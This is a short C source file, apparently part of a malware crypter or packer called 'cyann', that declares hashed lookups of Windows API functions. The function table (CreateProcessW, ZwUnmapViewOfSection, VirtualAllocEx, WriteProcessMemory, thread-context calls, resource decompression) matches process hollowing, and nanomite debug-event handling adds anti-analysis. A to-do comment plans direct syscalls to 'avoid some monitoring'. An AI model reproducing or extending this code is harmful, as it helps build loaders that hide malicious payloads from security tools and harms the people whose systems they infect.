# include "cyann.h"

DWORD		g_peb = 0;
t_nanomite	*g_ntable = NULL;

t_module	g_module[NBMODULE] =
{
	{-1792478162, 0},	//kernel32.dll
	{-440193616, 0}		//ntdll.dll
};

/* To do: Implement all possible function directly by their syscall => avoid some monitoring */
t_fonction	g_fonctions[NBFONCTION] =
{
	{0, 1885159918, 0},	//CreateProcessW
	{1, 91105351, 0},	//NtQueryInformationProcess
	{0, 1531546038, 0},	//ReadProcessMemory
	{1, 1378720139, 0},	//ZwUnmapViewOfSection
	{0, -756700832, 0},	//FindResourceW
	{0, 1023196896, 0},	//LoadResource
	{0, 2078624065, 0},	//LockResource
	{1, -149596339, 0},	//RtlDecompressBuffer
	{0, -801904841, 0},	//VirtualAllocEx
	{0, 764652709, 0},	//WriteProcessMemory
	{0, 1191553949, 0},	//GetThreadContext
	{0, 491899745, 0},	//SetThreadContext
	{0, 1178866553, 0},	//ResumeThread
	{0, 693544098, 0},	//DebugActiveProc
	{0, 84179851, 0},	//WaitForDebugEvent
	{0, -1038421060, 0},	//ContinueDebugEvent
	{0, -1270287042, 0}	//GetModuleFileNameW
};
